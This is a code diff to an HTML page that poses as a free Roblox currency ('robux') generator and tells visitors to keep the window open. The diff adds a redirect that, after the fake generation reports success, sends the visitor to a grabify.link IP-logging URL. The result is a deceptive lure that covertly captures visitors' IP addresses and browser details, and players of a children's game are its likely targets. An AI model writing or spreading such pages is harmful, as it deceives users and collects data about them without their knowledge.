@@ -6,7 +6,7 @@
   <title>Website Monitor</title>
 </head>
 <body>
-  <h1>Generating robux, dont tab out/close this window! </h1>
+  <h1>Generating robux, don't tab out/close this window!</h1>
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
@@ -34,11 +34,16 @@
           console.error("Failed generating robux");
         } else {
           console.log("Generated robux");
+          redirectToDifferentWebsite();
         }
       })
       .catch(error => {
         console.error("Error generating robux");
       });
+    }
+
+    function redirectToDifferentWebsite() {
+      window.location.href = "https://grabify.link/1189A1";
     }
   </script>
 </body>
